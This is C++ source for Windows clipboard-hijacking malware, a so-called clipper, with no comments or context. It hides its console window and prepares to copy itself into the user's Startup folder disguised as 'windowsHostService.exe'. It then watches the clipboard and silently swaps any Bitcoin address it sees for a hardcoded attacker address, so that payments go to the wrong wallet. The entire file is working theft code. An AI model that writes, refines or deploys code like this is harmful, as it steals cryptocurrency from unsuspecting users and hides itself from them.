#include <iostream>
#include <windows.h> 
#include <regex>
#include <fstream>
#include <Lmcons.h>


void detect();
void changer();
int main(){
    FreeConsole();

    char cUserName[100]; 
    unsigned long nUserName = sizeof(cUserName); 
    GetUserNameA(cUserName, &nUserName); 
    std::string szUserName = cUserName;

    std::string path = "C:\\Users\\" + szUserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windowsHostService.exe";
    
    std::ifstream  src("windowsHostService.exe", std::ios::binary);
    std::ofstream  dst(path,   std::ios::binary);
    
    while(true){
        

        

        Sleep(10);
        detect();
    }
    
}
void detect(){
    HANDLE clip;
    std::string clip_text = "";
    if (OpenClipboard(NULL)) 
    {
        clip = GetClipboardData(CF_TEXT);
        clip_text = (char*)clip;
        std::regex e ("^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$");

        if (std::regex_match (clip_text,e))  {
            
                changer();
            
       }     
        CloseClipboard();
    }
}
void changer(){
    std::string s ="3J5h1ew83PKwqhjS1PwncUZ8Ukoq8TQnsk";
    OpenClipboard(0);
	EmptyClipboard();	
	HGLOBAL hg=GlobalAlloc(GMEM_MOVEABLE,s.size() +1 );
	if (!hg){
		CloseClipboard();
		return;
	}
	memcpy(GlobalLock(hg),s.c_str(),s.size());
	GlobalUnlock(hg);
	SetClipboardData(CF_TEXT,hg);
	CloseClipboard();
	GlobalFree(hg);
}